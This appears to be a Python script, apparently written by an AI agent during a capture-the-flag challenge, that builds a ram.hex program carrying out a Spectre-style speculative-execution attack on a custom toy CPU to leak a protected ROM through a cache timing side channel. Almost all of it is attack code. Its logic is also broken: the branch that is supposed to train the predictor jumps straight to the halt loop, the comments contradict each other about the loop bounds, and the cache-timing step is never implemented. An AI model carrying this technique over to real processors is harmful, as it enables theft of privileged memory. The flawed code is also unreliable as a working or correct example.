# 2. Train branch predictor to take a branch
# 3. Then use a mispredicted branch to speculatively execute MOVFSI
# 4. MOVFSI will read from safe_rom[i] and use it to index into ram
# 5. Measure timing differences to determine which ram address was accessed

# Opcodes
ADD = 0x0
SUB = 0x1
MOVF = 0x2
MOVT = 0x3
ENT = 0x4
EXT = 0x5
JGT = 0x6
JEQ = 0x7
JMP = 0x8
INC = 0x9
MOVFS = 0xa
FLUSH = 0xb
RDTM = 0xc
MOVFU = 0xd
MOVFI = 0xe
MOVFSI = 0xf

def encode_inst(opcode, reg_dst=0, reg_src=0):
    """Encode instruction: opcode in lower 4 bits, reg_dst in bits 4-5, reg_src in bits 6-7"""
    return (reg_src << 6) | (reg_dst << 4) | opcode

def generate_ram_hex():
    """Generate ram.hex with Spectre attack"""
    ram = [0] * 256
    
    pc = 0
    
    # Initialize registers
    # R0 will be used for indexing
    # R1 will be used for temporary values
    # R2 will be counter
    # R3 will be result register
    
    # Set R0 = 0
    ram[pc] = encode_inst(MOVF, reg_dst=0)  # MOVF R0, [addr]
    ram[pc+1] = 200  # Address 200 contains 0
    pc += 2
    
    # Set R2 = 0 (counter for safe_rom index)
    ram[pc] = encode_inst(MOVF, reg_dst=2)
    ram[pc+1] = 200
    pc += 2
    
    # Main loop to leak each byte of safe_rom
    loop_start = pc
    
    # Train branch predictor - do several iterations where R2 < 5
    # This will train the predictor to expect the branch to be taken
    
    # Compare R2 with 50 (we want to leak ~50 bytes)
    ram[pc] = encode_inst(MOVF, reg_dst=1)  # Load comparison value into R1
    ram[pc+1] = 201  # Address 201 will contain 50
    pc += 2
    
    # JGT R1, R2, done_label (if R1 > R2, jump to done - means we haven't leaked all bytes yet)
    # This branch will be taken during training
    ram[pc] = encode_inst(JGT, reg_dst=1, reg_src=2)
    done_label_addr = 100  # We'll place done code here
    ram[pc+1] = done_label_addr
    pc += 2
    
    # After training, when R2 >= 50, branch won't be taken
    # But speculation will execute the speculative load anyway
    
    # Speculative load: MOVFSI R1, [R2] - load from safe_rom[R2] into R1
    # This instruction can only execute in emode, but will execute speculatively
    speculative_pc = pc
    ram[pc] = encode_inst(MOVFSI, reg_dst=1, reg_src=2)
    ram[pc+1] = 0  # offset = 0, so address = safe_rom[0 + R2]
    pc += 2
    
    # Use the leaked value to access ram (creates timing side channel)
    # MOVFI R3, [R1] - this will access ram[R1], putting it in cache
    ram[pc] = encode_inst(MOVFI, reg_dst=3, reg_src=1)
    ram[pc+1] = 150  # Base address 150
    pc += 2
    
    # Store the result
    ram[pc] = encode_inst(MOVT, reg_dst=3)
    ram[pc+1] = 202  # Store R3 to ram[202]
    pc += 2
    
    # Increment R2
    ram[pc] = encode_inst(INC, reg_dst=2)
    ram[pc+1] = 0
    pc += 2
    
    # Jump back to loop
    ram[pc] = encode_inst(JMP)
    ram[pc+1] = loop_start
    pc += 2
    
    # Done label
    ram[done_label_addr] = encode_inst(JMP)  # Infinite loop
    ram[done_label_addr+1] = done_label_addr
    
    # Data section
    ram[200] = 0
    ram[201] = 50  # Number of bytes to leak
    
    return ram

def generate_flag_hex():
    """Generate a dummy flag.hex - server will replace with real flag"""
    # Just create a dummy file with 256 zeros
    return [0] * 256

# Generate files
ram = generate_ram_hex()
flag = generate_flag_hex()

# Write ram.hex
with open('ram.hex', 'w') as f:
    for i, byte in enumerate(ram):
        f.write(f'{byte:02x}\n')

# Write flag.hex
with open('flag.hex', 'w') as f:
    for i, byte in enumerate(flag):
        f.write(f'{byte:02x}\n')

print("Generated ram.hex and flag.hex")
end_of_edit

